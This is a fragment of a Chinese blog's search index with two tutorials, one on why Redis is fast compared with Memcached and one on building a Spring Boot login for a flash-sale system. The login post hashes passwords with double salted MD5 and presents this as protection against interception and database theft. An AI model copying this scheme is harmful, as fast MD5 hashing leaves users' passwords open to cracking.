的形式存储，key和value的大小限制都是512Mb,与编码无关，所以数据安全。但是memcached限制key最大为250字节，value为1MB，况且只支持String类型。 redis提供主从复制：实现高可用的cache系统，支持集群中多个服务器之间的数据同步。 数据持久化：redis可以通过两种方式将数据进行持久化，一定程度上规避缓存中的数据不稳定的问题，也可以在重启服务器时最快的恢复缓存中所需的数据，提高了效率的同时减轻了主数据库系统的开销。 与传统的Memcached相比，优势还是很大的，但是Memcached也有不可替代的适用场景： 存储一些粒度比较小的静态数据，比如一些html片段，Memcached便是我们更好的选择。相对于redis而言，Memcached的元数据metadata更小些，所以相对来讲对于数据存储管理的性能更高，额外开销更小。 Memcached的特点：Memcached唯一支持的数据类型是String,所以更适合存储只读数据，因为字符串并不会因为额外的处理造成额外的开销。毕竟Memcached每次更新一个对象时，都需要重复执行下面的操作：获取整个字符串-&gt;反序列化为对象-&gt;修改其中的值-&gt;再次序列化该对象-&gt;在缓存中将整个字符串替换为新字符串。这样一来，更新存储数据就会有更高的消耗，可能就不是我们的最佳选择了。 6. redis快的原因总结 完全基于内存 Redis是纯内存数据库，相对于读写磁盘，读写内存的速度就不是几倍几十倍了，一般，hash查找可以达到每秒百万次的数量级。 多路复用IO “多路”指的是多个网络连接，“复用”指的是复用同一个线程。采用多路 I/O 复用技术可以让单个线程高效的处理多个连接请求（尽量减少网络IO的时间消耗）。可以直接理解为：单线程的原子操作，避免上下文切换的时间和性能消耗；加上对内存中数据的处理速度，很自然的提高redis的吞吐量。 6.1 Redis为什么是单线程的？因为CPU不是Redis的瓶颈。Redis的瓶颈最有可能是机器内存或者网络带宽。既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了。 6.2 为什么 Redis 中要使用 I/O 多路复用这种技术呢？首先，Redis 是跑在单线程中的，所有的操作都是按照顺序线性执行的，但是由于读写操作等待用户输入或输出都是阻塞的，所以 I/O 操作在一般情况下往往不能直接返回，这会导致某一文件的 I/O 阻塞导致整个进程无法对其它客户提供服务，而 I/O 多路复用就是为了解决这个问题而出现的。 假设你是一个老师，让30个学生解答一道题目，然后检查学生做的是否正确，你有下面几个选择： 第一种选择：按顺序逐个检查，先检查A，然后是B，之后是C、D。。。这中间如果有一个学生卡主，全班都会被耽误。这种模式就好比，你用循环挨个处理socket，根本不具有并发能力。 第二种选择：你创建30个分身，每个分身检查一个学生的答案是否正确。 这种类似于为每一个用户创建一个进程或者线程处理连接。 第三种选择，你站在讲台上等，谁解答完谁举手。这时C、D举手，表示他们解答问题完毕，你下去依次检查C、D的答案，然后继续回到讲台上等。此时E、A又举手，然后去处理E和A。。。 第三种就是IO复用模型，Linux下的select、poll和epoll就是干这个的。将用户socket对应的fd注册进epoll，然后epoll帮你监听哪些socket上有消息到达，这样就避免了大量的无用操作。此时的socket应该采用非阻塞模式。这样，整个过程只在调用select、poll、epoll这些调用的时候才会阻塞，收发客户消息是不会阻塞的，整个进程或者线程就被充分利用起来，这就是事件驱动，所谓的reactor模式。 6.3 redis的线程模型？Redis 服务采用 Reactor 的方式来实现文件事件处理器（每一个网络连接其实都对应一个文件描述符） 文件事件处理器使用 I/O 多路复用模块同时监听多个 FD，当 accept、read、write 和 close 文件事件产生时，文件事件处理器就会回调 FD 绑定的事件处理器。 虽然整个文件事件处理器是在单线程上运行的，但是通过 I/O 多路复用模块的引入，实现了同时对多个 FD 读写的监控，提高了网络通信模型的性能，同时也可以保证整个 Redis 服务实现的简单。 上面简单理解就是：多个网络连接并发读写redis的时候，先将对应的fd注册到epoll上，I/O多路复用模块会监听这些网络请求的情况，一旦有一个网络连接产生了accept、read、write 和 close 文件事件，I/O多路复用模块就会向文件事件分派器传送那些产生了事件的网络连接。 当然了，上面的文件事件可能会并发产生，这时的策略是，将所有产生事件的套接字（对应上面的网络连接）都入队到一个队列里面， 然后通过这个队列， 以有序（sequentially）、同步（synchronously）、每次一个套接字的方式向文件事件分派器传送套接字： 当上一个套接字产生的事件被处理完毕之后（该套接字为事件所关联的事件处理器执行完毕）， I/O 多路复用程序才会继续向文件事件分派器传送下一个套接字。 文件事件分派器接收 I/O 多路复用程序传来的套接字， 并根据套接字产生的事件的类型， 调用相应的事件处理器。 服务器会为执行不同任务的套接字关联不同的事件处理器， 这些处理器是一个个函数， 它们定义了某个事件发生时， 服务器应该执行的动作。 整个模块使 Redis 能以单进程运行的同时服务成千上万个文件描述符，避免了由于多进程应用的引入导致代码实现复杂度的提升，减少了出错的可能性。 最后，为什么redis比较快大概思路通俗的说就是：Redis是纯内存数据库，读取快，瓶颈在于IO上，如果使用阻塞式IO，因为是单线程的缘故，就会停止等待。所以采用IO多路复用监听文件描述符的状态，将对redis的开关读写换成事件，加入队列进行相应的事件处理，采用非阻塞IO，吞吐量比较大。 7. reids在linux下的安装Redis对于Linux是官方支持的，安装起来也非常地简单，直接编译源码然后进行安装即可。 这里以centos为例，大概说一下步骤： 下载redis编译工具:yum install gcc和yum install g++ 解压redis.tar.gz文件，进去之后进行编译:make 然后安装：make install PREFIX=/usr/local/redis 安装成功之后进入/usr/local/redis/bin下启动redis ./redis-server 8. redis在windows环境下的安装解压就能使用。下载地址为：https://github.com/MicrosoftArchive/redis/releases]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1. 登录功能]]></title>
    <url>%2F2018%2F07%2F21%2F1.%20%E7%99%BB%E5%BD%95%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[学习秒杀系统，了解高并发处理方案和思路，这是第一篇，完成基本的登录功能。 目标：初步实现用户登录功能,最终的代码：https://gitee.com/_swg/miaosha。 1. user表结构123456789101112CREATE TABLE `NewTable` (`id` bigint NOT NULL COMMENT '手机号码' ,`nickname` varchar(255) NOT NULL COMMENT '登录名' ,`password` varchar(32) NOT NULL COMMENT 'md5(md5(pass+固定salt)+salt)' ,`salt` varchar(10) NOT NULL COMMENT '盐值' ,`head` varchar(128) NOT NULL COMMENT '头像' ,`register_date` datetime NOT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '注册时间' ,`last_login_date` datetime NOT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '上次登录时间' ,`login_count` int(11) NOT NULL DEFAULT 0 COMMENT '登录次数' ,PRIMARY KEY (`id`)); 两次MD5： 用户端：PASS=MD5(明文+固定salt)：防止明文密码在网络传输时被截取 服务端：PASS=MD5(用户输入+随机salt)：防止数据库被盗 2. 代码逻辑2.1 前端处理这里在前端对密码进行了一次md5加密。1234567891011121314151617181920212223242526272829303132333435363738&lt;script&gt;function login()&#123; $("#loginForm").validate(&#123; submitHandler:function(form)&#123; doLogin(); &#125; &#125;);&#125;function doLogin()&#123; g_showLoading(); var inputPass = $("#password").val(); var salt = g_passsword_salt; var str = ""+salt.charAt(0)+salt.charAt(2) + inputPass +salt.charAt(5) + salt.charAt(4); var password = md5(str); $.ajax(&#123; url: "/login/do_login", type: "POST", data:&#123; mobile:$("#mobile").val(), password: password &#125;, success:function(data)&#123; layer.closeAll(); if(data.code == 0)&#123; layer.msg("成功"); window.location.href="/goods/to_list"; &#125;else&#123; layer.msg(data.msg); &#125; &#125;, error:function()&#123; layer.closeAll(); &#125; &#125;);&#125;&lt;/script&gt; 这里前端的渲染模板用的是thymeleaf： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt; 后端如何优雅地处理呢？ 2.2 定义一个vo来接收前端数据12345@Datapublic class LoginVo &#123; private String mobile; private String password;&#125; 2.3 数据校验我们可以用jsr303来进行校验，而不需要写很多代码来实现。 12345678910@Datapublic class LoginVo &#123; @NotNull @IsMobile private String mobile; @NotNull @Length(min=32) private String password;&#125; 这里需要依赖： 12345&lt;!--jsr303--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt;&lt;/dependency&gt; 对于其中的判断手机号码是否存在，我们需要自己来实现一下这个注解： 1234567891011121314@Target(&#123; METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER &#125;)@Retention(RUNTIME)@Documented@Constraint(validatedBy = &#123;IsMobileValidator.class &#125;)public @interface IsMobile &#123; boolean required() default true; String message() default "手机号码格式错误"; Class&lt;?&gt;[] groups() default &#123; &#125;; Class&lt;? extends Payload&gt;[] payload() default &#123; &#125;;&#125; 这个注解的功能是由IsMobileValidator.class来完成 123456789101112131415161718192021public class IsMobileValidator implements ConstraintValidator&lt;IsMobile, String&gt; &#123; private boolean required = false; public void initialize(IsMobile constraintAnnotation) &#123; required = constraintAnnotation.required(); &#125; public boolean isValid(String value, ConstraintValidatorContext context) &#123; if(required) &#123; return ValidatorUtil.isMobile(value); &#125;else &#123; if(StringUtils.isEmpty(value)) &#123; return true; &#125;else &#123; return ValidatorUtil.isMobile(value); &#125; &#125; &#125;&#125; 其中，ValidatorUtil.isMobile(value)是真正用来验证手机格式的： 123456789101112public class ValidatorUtil &#123; private static final Pattern mobile_pattern = Pattern.compile("1\\d&#123;10&#125;"); public static boolean isMobile(String src) &#123; if(StringUtils.isEmpty(src)) &#123; return false; &#125; Matcher m = mobile_pattern.matcher(src); return m.matches(); &#125;&#125; 这样，我们就可以实现对前端传来的参数进行校验了：@Valid LoginVo loginVo 123456@RequestMapping("/do_login")@ResponseBodypublic Result&lt;Boolean&gt; doLogin(@Valid LoginVo loginVo)&#123; userService.login(loginVo); return Result.success(true);&#125; 2.4 全局异常当校验参数时，这个参数时有问题时，我们需要一个全局异常来进行处理，将异常信息以合适的形式传给前端： GlobalException：123456789101112131415public class GlobalException extends RuntimeException&#123; private static final long serialVersionUID = 1L; private CodeMsg cm; public GlobalException(CodeMsg cm) &#123; super(cm.toString()); this.cm = cm; &#125; public CodeMsg getCm() &#123; return cm; &#125;&#125; 下面就是需要对异常进行拦截和处理： 1234567891011121314151617181920@ControllerAdvice@ResponseBodypublic class GlobalExceptionHandler &#123; @ExceptionHandler(value=Exception.class) public Result&lt;String&gt; exceptionHandler(HttpServletRequest request, Exception e)&#123; e.printStackTrace(); if(e instanceof GlobalException) &#123;//自定义的全局异常 GlobalException ex = (GlobalException)e; return Result.error(ex.getCm()); &#125;else if(e instanceof BindException) &#123;//数据参数校验的异常 BindException ex = (BindException)e; List&lt;ObjectError&gt; errors = ex.getAllErrors(); ObjectError error = errors.get(0); String msg = error.getDefaultMessage(); return Result.error(CodeMsg.BIND_ERROR.fillArgs(msg)); &#125;else &#123; return Result.error(CodeMsg.SERVER_ERROR); &#125; &#125;&#125; 2.5 返回结果封装类我们给前端返回的结果要有一个统一的格式： 1234567891011121314151617181920212223242526272829303132333435363738@Datapublic class Result&lt;T&gt; &#123; private int code; private String msg; private T data; /** * 成功时候的调用 * */ public static &lt;T&gt; Result&lt;T&gt; success(T data)&#123; return new Result&lt;T&gt;(data); &#125; /** * 失败时候的调用 * */ public static &lt;T&gt; Result&lt;T&gt; error(CodeMsg codeMsg)&#123; return new Result&lt;T&gt;(codeMsg); &#125; private Result(T data) &#123; this.data = data; &#125; private Result(int code, String msg) &#123; this.code = code; this.msg = msg; &#125; private Result(CodeMsg codeMsg) &#123; if(codeMsg != null) &#123; this.code = codeMsg.getCode(); this.msg = codeMsg.getMsg(); &#125; &#125;&#125; 2.6 异常信息分类因为会产生各种异常，为了方便出现问题时很快定位到异常的类型，我们需要对异常的类型进行统一的管理。 1234567891011121314151617181920212223242526272829303132333435@Data@NoArgsConstructor@AllArgsConstructor@ToStringpublic class CodeMsg &#123; private int code; private String msg; //通用的错误码 public static CodeMsg SUCCESS = new CodeMsg(0, "success"); public static CodeMsg SERVER_ERROR = new CodeMsg(500100, "服务端异常"); public static CodeMsg BIND_ERROR = new CodeMsg(500101, "参数校验异常：%s"); //登录模块 5002XX public static CodeMsg SESSION_ERROR = new CodeMsg(500210, "Session不存在或者已经失效"); public static CodeMsg PASSWORD_EMPTY = new CodeMsg(500211, "登录密码不能为空"); public static CodeMsg MOBILE_EMPTY = new CodeMsg(500212, "手机号不能为空"); public static CodeMsg MOBILE_ERROR = new CodeMsg(500213, "手机号格式错误"); public static CodeMsg MOBILE_NOT_EXIST = new CodeMsg(500214, "手机号不存在"); public static CodeMsg PASSWORD_ERROR = new CodeMsg(500215, "密码错误"); //商品模块 5003XX //订单模块 5004XX //秒杀模块 5005XX public CodeMsg fillArgs(Object... args) &#123; int code = this.code; String message = String.format(this.msg, args); return new CodeMsg(code, message); &#125; &#125; 2.7 login登录逻辑手机号码不存在或者密码不匹配，直接抛出全局异常异常，这个异常信息会被拦截，最后处理成相应的统一的格式进行返回。123456789101112131415161718192021public boolean login(LoginVo loginVo) &#123; if (loginVo == null) throw new GlobalException(CodeMsg.SERVER_ERROR); String mobile = loginVo.getMobile(); String password = loginVo.getPassword(); //判断手机号码是否存在 MiaoshaUser user = getById(Long.parseLong(mobile)); if(user == null)&#123; throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST); &#125; //验证密码是否匹配 String dbPass = user.getPassword(); String dbSalt = user.getSalt(); if(!MD5Util.formPassToDBPass(password,dbSalt).equals(dbPass))&#123; throw new GlobalException(CodeMsg.PASSWORD_ERROR); &#125; return true;&#125; 这里需要一个MD5的工具类，不贴了，但是注意要添加依赖： 123456789&lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt;]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
</search>
